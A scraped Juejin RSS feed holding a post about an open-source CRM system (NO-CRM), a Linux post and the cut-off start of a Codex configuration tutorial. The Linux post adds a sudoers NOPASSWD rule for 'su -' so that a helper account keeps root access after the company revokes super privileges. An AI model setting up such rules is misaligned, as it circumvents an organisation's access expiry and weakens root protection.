<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d791ad1a823d45e59f02809a6442f378~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5omn5b-15Z2a5oyB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832113&amp;x-signature=t3gmDQH7nM2%2Bax2aPgF8Sb%2F%2FQkQ%3D" alt="image.png" loading="lazy"/></p>
<p>当然啦，如果有大佬看到，觉得我的项目比较简单，勿喷！！！（需要源码，远程指导，可私聊）</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[耗时一周，我把可视化+零代码+AI融入到了CRM系统，使用体验超酷！]]></title>    <link>https://juejin.cn/post/7577171133444620324</link>    <guid>https://juejin.cn/post/7577171133444620324</guid>    <pubDate>2025-11-27T07:10:52.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7577171133444620324" data-draft-id="7576955345379164223" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="耗时一周，我把可视化+零代码+AI融入到了CRM系统，使用体验超酷！"/> <meta itemprop="keywords" content="JavaScript,GitHub,Vue.js"/> <meta itemprop="datePublished" content="2025-11-27T07:10:52.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="徐小夕"/> <meta itemprop="url" content="https://juejin.cn/user/3808363978429613"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            耗时一周，我把可视化+零代码+AI融入到了CRM系统，使用体验超酷！
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3808363978429613/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    徐小夕
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T07:10:52.000Z" title="Thu Nov 27 2025 07:10:52 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>最近花了一周时间，配合AI，打磨了一款CRM客户管理系统——NO-CRM。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c117b63f38154aa9bc0f4b268f3d3d4a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6Q5bCP5aSV:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832252&amp;x-signature=6iAor9C73AnGvy449wYiZhA%2FmVQ%3D" alt="图片" loading="lazy"/></p>
<p>客户关系管理（CRM）系统的核心价值在于<strong>以客户为中心，通过数字化手段打通 “获客 - 转化 - 留存 - 复购 - 推荐” 全链路</strong>，帮助企业降本增效、提升客户价值与市场竞争力。</p>
<ul>
<li>体验地址：<a href="https://link.juejin.cn?target=http%3A%2F%2Fno-crm.flowmix.cn%2F" target="_blank" title="http://no-crm.flowmix.cn/" ref="nofollow noopener noreferrer">no-crm.flowmix.cn/</a></li>
<li>本地安装开源地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FMrXujiang%2FNO-CRM" target="_blank" title="https://github.com/MrXujiang/NO-CRM" ref="nofollow noopener noreferrer">github.com/MrXujiang/N…</a></li>
</ul>
<p>做这款CRM系统之前，我研究了市面上比较流行的商业产品，结合了我之前设计的零代码理念，做了一款从客户管理，数据分析，到用户收集，再到工作流设计的一整套解决方案，大家可以直接部署使用。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/33b2afc6a8844ac098c9552acecbb0c9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6Q5bCP5aSV:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832252&amp;x-signature=MKR7V9gDB4RmWgBzQm6WNXsTYCw%3D" alt="图片" loading="lazy"/></p>
<p>我们可以直接在CRM中在线设计各种收集表单：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/be045167b681424381e1a66e54134b77~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6Q5bCP5aSV:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832252&amp;x-signature=7sh0eYgE1BhlO4j%2BLnK%2FSfuyGpc%3D" alt="图片" loading="lazy"/></p>
<p>后台自带了表单收集和统计分析功能，同时还能设计工作流：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bcba1cbe5c0247ddb07958dbe856aa4c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6Q5bCP5aSV:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832252&amp;x-signature=VRUrDsrnfa0w3SCltbOj6c8Od08%3D" alt="图片" loading="lazy"/></p>
<p>并自定义工作流和审批条件：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c5a6015a6c9f422dbd941bbe5e45f514~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6Q5bCP5aSV:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832252&amp;x-signature=OrpglDKS7MHvBGbf8txY%2FczQvgY%3D" alt="图片" loading="lazy"/></p>
<p>当然还有AI分析模块，我们可以通过AI帮我们分析线索数据：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/56a3d5c91c144f98bd0b6df8aa03390a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6Q5bCP5aSV:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832252&amp;x-signature=oXMKrHRAHlbx9ddAAiT2MY6RMLk%3D" alt="图片" loading="lazy"/></p>
<p>我已经把这个CRM系统镜像开源，大家可以直接安装或者部署到服务器直接使用。</p>
<ul>
<li>本地安装开源地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FMrXujiang%2FNO-CRM" target="_blank" title="https://github.com/MrXujiang/NO-CRM" ref="nofollow noopener noreferrer">github.com/MrXujiang/N…</a></li>
</ul>
<p>接下来就和大家一起分享一下我做的这款全栈CRM 系统。</p>
<h2 data-id="heading-0">✨ 特性</h2>
<ul>
<li>🎨 <strong>现代化 UI</strong> - 基于 TDesign Vue Next，提供精美的企业级界面</li>
<li>📊 <strong>数据可视化</strong> - ECharts 驱动的数据大屏和图表分析</li>
<li>🔐 <strong>完善的权限系统</strong> - RBAC 权限模型，支持角色、部门、用户细粒度权限控制</li>
<li>🤖 <strong>AI 智能助手</strong> - 集成 AI 功能，提供智能推荐和辅助决策</li>
<li>🔄 <strong>工作流引擎</strong> - 可视化流程设计器，支持复杂业务流程编排</li>
<li>📝 <strong>表单设计器</strong> - 拖拽式表单设计，支持多种字段类型和校验规则</li>
<li>📱 <strong>移动端适配</strong> - 完美支持各种设备，响应式设计</li>
<li>💾 <strong>轻量化存储</strong> - 基于 JSON 文件存储，无需复杂数据库配置</li>
<li>🚀 <strong>开箱即用</strong> - 简单配置即可快速部署上线</li>
<li>🔧 <strong>高度可定制</strong> - 模块化设计，易于扩展和二次开发</li>
</ul>
<h2 data-id="heading-1">技术栈</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a86581cd4f3340668124f1aa0c23a391~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6Q5bCP5aSV:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832252&amp;x-signature=RWM72H4%2BK3SSOVnHrBR1JB6w2po%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-2">前端技术</h3>























































<table><thead><tr><th>技术</th><th>版本</th><th>说明</th></tr></thead><tbody><tr><td>Vue 3</td><td>3.5.13</td><td>渐进式 JavaScript 框架</td></tr><tr><td>TypeScript</td><td>5.7.3</td><td>JavaScript 的超集，提供类型安全</td></tr><tr><td>Vite</td><td>6.0.5</td><td>下一代前端构建工具</td></tr><tr><td>TDesign Vue Next</td><td>1.10.6</td><td>腾讯企业级组件库</td></tr><tr><td>Pinia</td><td>2.3.0</td><td>Vue 官方状态管理库</td></tr><tr><td>Vue Router</td><td>4.5.0</td><td>Vue 官方路由管理器</td></tr><tr><td>ECharts</td><td>6.0.0</td><td>强大的数据可视化库</td></tr><tr><td>Vue Flow</td><td>1.47.0</td><td>流程图编辑器</td></tr><tr><td>Axios</td><td>1.7.9</td><td>HTTP 客户端</td></tr></tbody></table>
<h3 data-id="heading-3">后端技术</h3>








































<table><thead><tr><th>技术</th><th>版本</th><th>说明</th></tr></thead><tbody><tr><td>NestJS</td><td>11.0.1</td><td>渐进式 Node.js 框架</td></tr><tr><td>TypeScript</td><td>5.7.3</td><td>类型安全的开发体验</td></tr><tr><td>Passport JWT</td><td>4.0.1</td><td>JWT 身份验证策略</td></tr><tr><td>Bcrypt</td><td>5.1.1</td><td>密码加密库</td></tr><tr><td>Multer</td><td>2.0.2</td><td>文件上传中间件</td></tr><tr><td>Class Validator</td><td>0.14.2</td><td>基于装饰器的参数验证</td></tr></tbody></table>
<h3 data-id="heading-4">已实现功能</h3>
<ul>
<li><strong>用户认证</strong></li>
<li>
<ul>
<li>用户注册与登录</li>
<li>JWT token 认证</li>
<li>角色权限控制（管理员/销售）</li>
</ul>
</li>
<li><strong>客户管理</strong></li>
<li>
<ul>
<li>客户列表查看与搜索</li>
<li>新建、编辑、删除客户</li>
<li>客户详情查看</li>
<li>标签管理</li>
</ul>
</li>
<li><strong>线索管理</strong></li>
<li>
<ul>
<li>线索状态流转（未跟进→跟进中→已合格→已成交/无效）</li>
<li>意向等级管理</li>
<li>线索筛选</li>
</ul>
</li>
<li><strong>跟进记录</strong></li>
<li>
<ul>
<li>多种跟进方式（电话、邮件、会议等）</li>
<li>时间线展示</li>
<li>下次跟进提醒</li>
</ul>
</li>
<li><strong>任务管理</strong></li>
<li>
<ul>
<li>待办事项管理</li>
<li>优先级设置</li>
<li>到期提醒</li>
<li>任务状态切换</li>
</ul>
</li>
<li><strong>文件上传</strong></li>
<li>
<ul>
<li>支持图片、PDF、Word、Excel 文件上传</li>
<li>客户附件管理</li>
<li>文件在线预览和下载</li>
</ul>
</li>
<li><strong>数据大屏</strong></li>
<li>
<ul>
<li>实时统计数据展示</li>
<li>Echarts 图表可视化</li>
<li>多维度数据分析</li>
</ul>
</li>
<li><strong>其他功能</strong></li>
<li>
<ul>
<li>分页支持（所有列表）</li>
<li>Mock 数据生成</li>
<li>数据搜索和筛选</li>
</ul>
</li>
</ul>
<p>当然对于企业团队来说，组织部门管理也是必备的，NO-CRM也实现了动态创建组织部门的功能，并能基于组织部门设置单独的权限：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/81b9563bcc2b400cb2c55ba0fbdcb9a3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6Q5bCP5aSV:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764832252&amp;x-signature=T5Hes91h2%2FVFg9IZgyVfodu9Y5s%3D" alt="图片" loading="lazy"/></p>
<p>当然还有很多高价值的功能，大家可以线上体验：</p>
<ul>
<li>演示地址：<a href="https://link.juejin.cn?target=http%3A%2F%2Fno-crm.flowmix.cn" target="_blank" title="http://no-crm.flowmix.cn" ref="nofollow noopener noreferrer">no-crm.flowmix.cn</a></li>
<li>开源地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FMrXujiang%2FNO-CRM" target="_blank" title="https://github.com/MrXujiang/NO-CRM" ref="nofollow noopener noreferrer">github.com/MrXujiang/N…</a></li>
</ul>
<p>好啦，今天的分享就到这，如果你有好的建议，欢迎留言区交流反馈～</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[机器配置免密切root]]></title>    <link>https://juejin.cn/post/7577201863751106600</link>    <guid>https://juejin.cn/post/7577201863751106600</guid>    <pubDate>2025-11-27T06:57:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7577201863751106600" data-draft-id="7577201863725400064" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="机器配置免密切root"/> <meta itemprop="keywords" content="Linux"/> <meta itemprop="datePublished" content="2025-11-27T06:57:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="用户47602202278"/> <meta itemprop="url" content="https://juejin.cn/user/977882868360796"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            机器配置免密切root
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/977882868360796/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    用户47602202278
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T06:57:34.000Z" title="Thu Nov 27 2025 06:57:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、背景</h2>
<p>公司申请机器登陆权限，只有worker权限能长期保留，super权限会一个月后收回，因此对于一些服务的运维与问题排查而言，仅仅只有worker权限，无法切到root用户下执行一些命令，会非常不方便。如果直接配置免密切换root，那所有申请了登陆权限的人都可以直接切到root，不通角色权限的区分就形同虚设了，因此设计了一个兼顾安全性的免密切换root的方案，以保证负责该机器服务的管理人员在 super 权限被回收的情况下，仍具备紧急进入 root 的能力，从而在服务出现故障时能够第一时间排查和修复，避免影响业务运行。</p>
<h2 data-id="heading-1">二、方案设计</h2>
<ol>
<li>
<p><strong>新建跳板用户</strong></p>
<ul>
<li>创建一个专属用户（如 <code>rootjump</code>），该用户用于作为进入 root 的跳板。</li>
<li>切换到此用户需要输入密码，且密码仅持有者本人知晓。</li>
</ul>
</li>
<li>
<p><strong>配置免密切 root</strong></p>
<ul>
<li>
<p>在 <code>/etc/sudoers</code> 文件中为该跳板用户配置：</p>
<pre><code class="hljs language-css" lang="css">rootjump <span class="hljs-attribute">ALL</span>=(<span class="hljs-attribute">ALL</span>) NOPASSWD: /bin/su -
</code></pre>
<p>仅此用户可免密执行 <code>su -</code> 切换到 root。</p>
</li>
</ul>
</li>
<li>
<p><strong>权限隔离保障</strong></p>
<ul>
<li>其他拥有 worker 权限的业务用户无法直接切到该跳板用户（因不知道其密码），因此也就无法利用免密切 root 功能。</li>
<li>保留了 root 原密码，防止直接 root 登录。</li>
</ul>
</li>
</ol>
<h2 data-id="heading-2">三、步骤</h2>
<ol>
<li><strong>新建跳板用户</strong></li>
</ol>
<p>必须在root用户下进行操作，我的用户名为 minio：</p>
<pre><code class="hljs language-markdown" lang="markdown">sudo useradd -m minio
sudo passwd minio

<span class="hljs-bullet">-</span> <span class="hljs-code">`-m`</span> → 自动创建 home 目录（如 <span class="hljs-code">`/home/minio`</span>）
<span class="hljs-bullet">-</span>  然后 <span class="hljs-code">`passwd minio`</span> 设置密码，会提示你输入两遍
</code></pre>
<p>2.  <strong>配置免密切 root</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">在 <span class="hljs-string">`/etc/sudoers`</span> 文件中为该跳板用户配置：

    vim /etc/sudoers

    设置
    minio <span class="hljs-variable constant_">ALL</span>=(<span class="hljs-variable constant_">ALL</span>) <span class="hljs-attr">NOPASSWD</span>: <span class="hljs-regexp">/bin/</span>su -


    仅此用户可免密执行 <span class="hljs-string">`sudo su -`</span> 切换到 root。
</code></pre>
<p>3.  <strong>检验</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c10ca06df8854c5694e17ca4e8996ddf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3NDc2MDIyMDIyNzg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764831454&amp;x-signature=AGadtBWuO9seyJ35ggMJjAF7wUw%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[使用自定义API接入OpenAI CodeX配置教程]]></title>    <link>https://juejin.cn/post/7577049352838283279</link>    <guid>https://juejin.cn/post/7577049352838283279</guid>    <pubDate>2025-11-27T07:08:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7577049352838283279" data-draft-id="7577201863751122984" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="使用自定义API接入OpenAI CodeX配置教程"/> <meta itemprop="keywords" content="OpenAI"/> <meta itemprop="datePublished" content="2025-11-27T07:08:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Jim860"/> <meta itemprop="url" content="https://juejin.cn/user/1614520451597639"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" 